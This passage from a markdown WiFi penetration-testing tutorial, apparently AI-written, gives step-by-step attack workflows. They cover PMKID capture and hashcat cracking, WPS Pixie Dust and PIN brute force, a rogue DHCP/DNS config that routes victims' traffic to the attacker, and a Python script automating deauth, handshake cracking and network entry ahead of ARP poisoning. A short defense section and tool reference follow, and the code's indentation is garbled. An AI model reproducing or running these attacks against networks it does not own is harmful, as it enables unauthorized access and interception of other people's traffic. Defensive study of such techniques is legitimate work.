																																sudo mdk4 wlan0mon b
																																
																																# Why deauth is useful:
																																# 1. Force handshake capture (device reconnects)
																																# 2. Force clients to evil twin
																																# 3. Test your own network's resilience
																																# 4. Test if WPA3 protects against it
																																#    (WPA3 with PMF = protected from deauth!)
																																```
																																
																																---
																																
																																## 11. PMKID Attack
																																
																																Best modern attack — no waiting for clients:
																																
																																```bash
																																# Complete PMKID attack workflow
																																
																																# Step 1: Install tools
																																sudo apt install hcxtools hcxdumptool hashcat
																																
																																# Step 2: Stop NetworkManager
																																sudo systemctl stop NetworkManager
																																sudo systemctl stop wpa_supplicant
																																
																																# Step 3: Set adapter to monitor mode
																																sudo ip link set wlan0 down
																																sudo iw wlan0 set type monitor
																																sudo ip link set wlan0 up
																																
																																# Step 4: Create target file with your AP's MAC
																																echo "AABBCCDDEEFF" > /tmp/targets.txt
																																# (MAC without colons, uppercase)
																																
																																# Step 5: Capture PMKID
																																sudo hcxdumptool \
																																-i wlan0 \
																																-o /tmp/capture.pcapng \
																																--filterlist_ap=/tmp/targets.txt \
																																--filtermode=2 \
																																--enable_status=15
																																
																																# Let run for 2-5 minutes
																																# Press Ctrl+C when done
																																
																																# Step 6: Extract PMKID
																																hcxpcapngtool \
																																-o /tmp/hashes.hc22000 \
																																/tmp/capture.pcapng
																																
																																# Check what was captured
																																wc -l /tmp/hashes.hc22000
																																# If > 0, you have hashes to crack!
																																
																																# Step 7: Crack with hashcat
																																hashcat \
																																-m 22000 \
																																/tmp/hashes.hc22000 \
																																/usr/share/wordlists/rockyou.txt \
																																--force
																																
																																# Show cracked passwords
																																hashcat \
																																-m 22000 \
																																/tmp/hashes.hc22000 \
																																--show
																																```
																																
																																---
																																
																																## 12. WPS Attacks
																																
																																```bash
																																# Full WPS attack workflow
																																
																																# Step 1: Scan for WPS-enabled networks
																																sudo wash \
																																-i wlan0mon \
																																-C          # Ignore FCS errors
																																
																																# Step 2: Pixie Dust (fast, tries in seconds)
																																sudo reaver \
																																-i wlan0mon \
																																-b AA:BB:CC:DD:EE:FF \
																																-K 1 \
																																-N \
																																-vvv
																																
																																# -K 1 = Pixie Dust
																																# -N   = Don't send NACK messages
																																# -vvv = Very verbose
																																
																																# If Pixie Dust fails, try standard:
																																sudo reaver \
																																-i wlan0mon \
																																-b AA:BB:CC:DD:EE:FF \
																																-vvv \
																																-N \
																																-d 1 \      # 1 second delay between attempts
																																-r 3:15     # Restart after 3 failures, wait 15 seconds
																																
																																# Bully (alternative)
																																sudo bully \
																																-b AA:BB:CC:DD:EE:FF \
																																-c 6 \
																																-d \
																																-v 3 \
																																wlan0mon
																																
																																# When WPS PIN is found:
																																# Reaver shows: WPS PIN: '12345670'
																																# Reaver shows: WPA PSK: 'YourActualWiFiPassword'
																																```
																																
																																---
																																
																																## 13. Rogue DHCP
																																
																																Become the DHCP server — control everyone's DNS and gateway:
																																
																																```bash
																																# When a device connects to WiFi, it asks:
																																# "Who is the DHCP server? Give me an IP!"
																																# Normally router answers
																																# If YOU answer faster, you control:
																																# - What IP they get
																																# - What DNS server they use (= DNS poisoning!)
																																# - What gateway they use (= all traffic through you!)
																																
																																# Set up rogue DHCP with dnsmasq
																																cat > /tmp/rogue_dhcp.conf << EOF
																																interface=wlan0
																																dhcp-range=192.168.1.200,192.168.1.250,255.255.255.0,1h
																																dhcp-option=3,192.168.1.150    # Tell them YOU are the gateway
																																dhcp-option=6,192.168.1.150    # Tell them YOU are the DNS server
																																server=8.8.8.8
																																address=/#/192.168.1.150       # All DNS → you
																																log-queries
																																log-facility=/tmp/rogue_dns.log
																																EOF
																																
																																sudo dnsmasq -C /tmp/rogue_dhcp.conf --no-daemon
																																
																																# Now when new device connects:
																																# Gets IP from you (faster than router)
																																# Uses YOU as DNS and gateway
																																# ALL their traffic → you
																																# DNS queries → you (see every domain!)
																																```
																																
																																---
																																
																																## 14. Full Automated Attack Scripts
																																
																																### Complete Outside Attack Automation
																																
																																```python
																																# full_outside_attack.py
																																# Automates: recon → crack → connect → MITM → capture
																																
																																import subprocess
																																import time
																																import os
																																import sys
																																
																																class OutsideAttack:
																																
																																def __init__(self, interface="wlan0", target_ssid=None):
																																self.interface = interface
																																self.monitor_iface = interface + "mon"
																																self.target_ssid = target_ssid
																																self.target_bssid = None
																																self.target_channel = None
																																self.cracked_password = None
																																
																																def enable_monitor_mode(self):
																																print("[*] Enabling monitor mode...")
																																subprocess.run(["sudo", "airmon-ng", "check", "kill"],
																																			   capture_output=True)
																																subprocess.run(["sudo", "airmon-ng", "start", self.interface],
																																			   capture_output=True)
																																print(f"[+] Monitor mode enabled: {self.monitor_iface}")
																																
																																def scan_networks(self, duration=15):
																																print(f"[*] Scanning networks for {duration} seconds...")
																																
																																proc = subprocess.Popen([
																																	"sudo", "airodump-ng", self.monitor_iface,
														"--output-format", "csv",
														"-w", "/tmp/scan"
																																], stderr=subprocess.DEVNULL)
																																
																																time.sleep(duration)
																																proc.terminate()
																																
																																# Parse CSV
																																try:
																																with open("/tmp/scan-01.csv", "r", errors='ignore') as f:
																																content = f.read()
																																
																																networks = []
																																in_clients = False
																																
																																for line in content.split('\n'):
																																	line = line.strip()
																																	if not line:
																																		continue
																																		if 'Station MAC' in line:
																																			in_clients = True
																																			continue
																																			if in_clients:
																																				continue
																																				
																																				parts = [p.strip() for p in line.split(',')]
																																				if len(parts) >= 14 and len(parts[0]) == 17:
																																					networks.append({
																																						'bssid': parts[0],
																																						'channel': parts[3].strip(),
																																									'encryption': parts[5].strip(),
																																									'ssid': parts[13].strip()
																																					})
																																					
																																					return networks
																																					except:
																																					return []
																																					
																																					def find_target(self, networks):
																																					if self.target_ssid:
																																						for n in networks:
																																							if n['ssid'] == self.target_ssid:
																																								self.target_bssid = n['bssid']
																																								self.target_channel = n['channel']
																																								print(f"[+] Found target: {n['ssid']} "
																																								f"({n['bssid']}) CH:{n['channel']}")
																																								return True
																																								else:
																																									# Show all and let user pick
																																									print("\n[*] Available networks:")
																																									for i, n in enumerate(networks):
																																										print(f"  {i}: {n['ssid']:<30} {n['bssid']}  "
																																										f"CH:{n['channel']:<4} {n['encryption']}")
																																										
																																										choice = int(input("\nSelect target number: "))
																																										n = networks[choice]
																																										self.target_ssid = n['ssid']
																																										self.target_bssid = n['bssid']
																																										self.target_channel = n['channel']
																																										return True
																																										
																																										return False
																																										
																																										def capture_handshake(self, timeout=60):
																																										print(f"[*] Capturing handshake from {self.target_ssid}...")
																																										
																																										# Start capture
																																										capture_proc = subprocess.Popen([
																																											"sudo", "airodump-ng",
																		  "-c", self.target_channel,
																		  "--bssid", self.target_bssid,
																		  "-w", "/tmp/handshake",
																		  self.monitor_iface
																																										], stderr=subprocess.DEVNULL)
																																										
																																										time.sleep(5)
																																										
																																										# Send deauth to force handshake
																																										print("[*] Sending deauth packets...")
																																										subprocess.run([
																																											"sudo", "aireplay-ng",
														 "-0", "10",
														 "-a", self.target_bssid,
														 self.monitor_iface
																																										], capture_output=True)
																																										
																																										time.sleep(10)
																																										capture_proc.terminate()
																																										
																																										# Check for handshake
																																										result = subprocess.run([
																																											"aircrack-ng", "/tmp/handshake-01.cap"
																																										], capture_output=True, text=True)
																																										
																																										if "handshake" in result.stdout.lower():
																																											print("[+] Handshake captured!")
																																											return True
																																											
																																											print("[-] No handshake captured, trying PMKID...")
																																											return False
																																											
																																											def crack_password(self, wordlist="/usr/share/wordlists/rockyou.txt"):
																																											print("[*] Attempting to crack password...")
																																											
																																											# Try aircrack-ng
																																											result = subprocess.run([
																																												"aircrack-ng",
																   "-w", wordlist,
																   "-b", self.target_bssid,
																   "/tmp/handshake-01.cap"
																																											], capture_output=True, text=True, timeout=300)
																																											
																																											# Look for password in output
																																											import re
																																											match = re.search(r'KEY FOUND!\s*\[\s*(.+?)\s*\]', result.stdout)
																																											if match:
																																												self.cracked_password = match.group(1)
																																												print(f"[+] Password cracked: {self.cracked_password}")
																																												return True
																																												
																																												print("[-] Password not in wordlist")
																																												return False
																																												
																																												def connect_to_network(self):
																																												if not self.cracked_password:
																																													return False
																																													
																																													print(f"[*] Connecting to {self.target_ssid}...")
																																													
																																													# Stop monitor mode
																																													subprocess.run(["sudo", "airmon-ng", "stop", self.monitor_iface],
																																																   capture_output=True)
																																													
																																													# Connect
																																													result = subprocess.run([
																																														"sudo", "nmcli", "device", "wifi", "connect",
																	 self.target_ssid,
																	 "password", self.cracked_password
																																													], capture_output=True, text=True, timeout=30)
																																													
																																													if "successfully" in result.stdout.lower():
																																														print("[+] Connected to network!")
																																														
																																														# Get our IP
																																														time.sleep(3)
																																														result = subprocess.run(["ip", "addr", "show", self.interface],
																																																				capture_output=True, text=True)
																																														import re
																																														ip_match = re.search(r'inet (\d+\.\d+\.\d+\.\d+)', result.stdout)
																																														if ip_match:
																																															my_ip = ip_match.group(1)
																																															print(f"[+] Got IP: {my_ip}")
																																															return my_ip
																																															
																																															return False
																																															
																																															def run_full_attack(self):
																																															print("\n" + "="*55)
																																															print("FULL OUTSIDE ATTACK - SECURITY RESEARCH LAB")
																																															print("="*55)
																																															
																																															# Phase 1: Recon
																																															self.enable_monitor_mode()
																																															networks = self.scan_networks()
																																															
																																															if not networks:
																																																print("[-] No networks found")
																																																return
																																																
																																																if not self.find_target(networks):
																																																	print("[-] Target not found")
																																																	return
																																																	
																																																	# Phase 2: Crack
																																																	self.capture_handshake()
																																																	if not self.crack_password():
																																																		print("[-] Could not crack password")
																																																		return
																																																		
																																																		# Phase 3: Connect
																																																		my_ip = self.connect_to_network()
																																																		if not my_ip:
																																																			print("[-] Could not connect")
																																																			return
																																																			
																																																			print(f"\n[+] SUCCESS! Inside network as {my_ip}")
																																																			print("[*] Ready for internal attack phase")
																																																			print(f"\n[*] Next steps:")
																																																			print(f"    1. sudo nmap -sn 192.168.1.0/24  (find devices)")
																																																			print(f"    2. Start ARP poisoning")
																																																			print(f"    3. Deploy payloads")
																																																			
																																																			# Run attack
																																																			attacker = OutsideAttack(
																																																				interface="wlan0",
																			target_ssid="YourWiFiName"   # Your own network
																																																			)
																																																			attacker.run_full_attack()
																																																			```
																																																			
																																																			---
																																																			
																																																			## 15. Defending Against All of This
																																																			
																																																			Now that you understand every attack, here's how to defend:
																																																			
																																																			### Defend Against WiFi Cracking
																																																			
																																																			```
																																																			WPA2 Password Defense:
																																																			✓ Use 20+ character password with mixed chars
																																																			✓ Example: "correct-horse-battery-staple-2024!"
																																																			✓ Avoid: names, dates, phone numbers, common words
																																																			✗ "password123" → cracked in seconds
																																																			✗ "MyWifi2024"  → cracked in minutes
																																																			✗ "12345678"    → cracked instantly
																																																			
																																																			WPS Defense:
																																																			✓ DISABLE WPS in router settings!
																																																			✓ Admin panel → Wireless → WPS → Disable
																																																			✓ This completely stops Pixie Dust and PIN attacks
																																																			
																																																			WPA3:
																																																			✓ Enable WPA3 if router supports it
																																																			✓ WPA3-SAE is immune to offline dictionary attacks
																																																			✓ WPA3 + PMF = immune to deauth attacks
																																																			```
																																																			
																																																			### Detect Evil Twin
																																																			
																																																			```
																																																			Signs your device connected to evil twin:
																																																			- HTTPS certificate warnings
																																																			- Captive portal appears unexpectedly
																																																			- Slower internet speed
																																																			- WiFi shows "Connected, no internet"
																																																			
																																																			Tools to detect:
																																																			- WiFi Analyzer app (Android): shows signal strength,
																																																			two APs with same name = evil twin!
																																																			- wifite: shows duplicate SSIDs
																																																			
																																																			Defense:
																																																			✓ Never enter WiFi password in a captive portal
																																																			(Your router never asks for this!)
																																																			✓ Use VPN - encrypts traffic even through evil twin
																																																			✓ Check certificate when HTTPS warnings appear
																																																			```
																																																			
																																																			### Detect ARP Poisoning
																																																			
																																																			```bash
																																																			# Check your ARP table
																																																			arp -a
																																																			
																																																			# Poisoned: two IPs sharing one MAC
																																																			# 192.168.1.1  at aa:bb:cc:dd:ee:ff   ← router
																																																			# 192.168.1.105 at aa:bb:cc:dd:ee:ff  ← SAME MAC = someone is poisoning!
																																																			
																																																			# Prevention: use static ARP entries
																																																			sudo arp -s 192.168.1.1 AA:BB:CC:DD:EE:FF
																																																			# Can't be overwritten by ARP spoofing!
																																																			
																																																			# App: XArp (detects ARP poisoning in real time)
																																																			# Enable "ARP poisoning detection" in router if available
																																																			```
																																																			
																																																			---
																																																			
																																																			## 16. Tools Reference
																																																			
																																																			| Tool | Purpose | Install |
																																																			|---|---|---|
																																																			| **aircrack-ng** | WPA2 handshake cracking | `apt install aircrack-ng` |
																																																			| **airodump-ng** | WiFi scanning/capture | Part of aircrack-ng |
																																																			| **aireplay-ng** | Packet injection/deauth | Part of aircrack-ng |
																																																			| **hcxdumptool** | PMKID capture | `apt install hcxdumptool` |
																																																			| **hcxtools** | Convert captures | `apt install hcxtools` |
																																																			| **hashcat** | GPU password cracking | `apt install hashcat` |
																																																			| **reaver** | WPS PIN attack | `apt install reaver` |
																																																			| **bully** | WPS alternative | `apt install bully` |
																																																			| **wash** | WPS scanner | Part of reaver |
																																																			| **mdk4** | Advanced WiFi attacks | `apt install mdk4` |
																																																			| **bettercap** | MITM framework | `apt install bettercap` |
																																																			| **hostapd** | Create fake AP | `apt install hostapd` |
																																																			| **dnsmasq** | DHCP/DNS server | `apt install dnsmasq` |
																																																			| **airgeddon** | All-in-one WiFi tool | GitHub |
																																																			| **wifite** | Automated WiFi attacks | `apt install wifite2` |
																																																			| **macchanger** | MAC address spoofing | `apt install macchanger` |
																																																			| **nmap** | Network scanning | `apt install nmap` |
																																																			| **metasploit** | Device exploitation | Pre-installed on Parrot |
																																																			
																																																			### One-Command Install Everything
																																																			
																																																			```bash
																																																			sudo apt update && sudo apt install -y \
																																																			aircrack-ng hcxdumptool hcxtools hashcat \
																																																			reaver bully mdk4 bettercap hostapd dnsmasq \
																																																			wifite2 macchanger nmap dsniff python3-flask \
																																																			metasploit-framework && \
																																																			pip3 install scapy requests
																																																			```
																																																			
																																																			### Attack Quick Reference
																																																			
																																																			```bash
																																																			# Enable monitor mode
																																																			sudo airmon-ng start wlan0
																																																			
																																																			# Scan networks
																																																			sudo airodump-ng wlan0mon
																																																			
																																																			# Capture WPA2 handshake
																																																			sudo airodump-ng -c CH --bssid MAC -w /tmp/cap wlan0mon &
																																																			sudo aireplay-ng -0 5 -a MAC wlan0mon
																																																			
																																																			# PMKID attack
																																																			sudo hcxdumptool -i wlan0 -o /tmp/cap.pcapng
																																																			hcxpcapngtool -o /tmp/h.hc22000 /tmp/cap.pcapng
																																																			
																																																			# Crack
																																																			hashcat -m 22000 /tmp/h.hc22000 rockyou.txt
																																																			
																																																			# Connect
																																																			nmcli device wifi connect "SSID" password "PASSWORD"
																																																			
																																																			# After inside: ARP poison
																																																			echo 1 > /proc/sys/net/ipv4/ip_forward
																																																			sudo arpspoof -i wlan0 -t TARGET GATEWAY &
																																																			sudo arpspoof -i wlan0 -t GATEWAY TARGET &
																																																			```
																																																			
																																																			---
																																																			
																																																			*This is your own network, your own devices, your own research.*
																																																			*Understanding how attacks work is the foundation of building real defenses.*
																																																			*Document everything you find — that's what a real penetration test report looks like.*
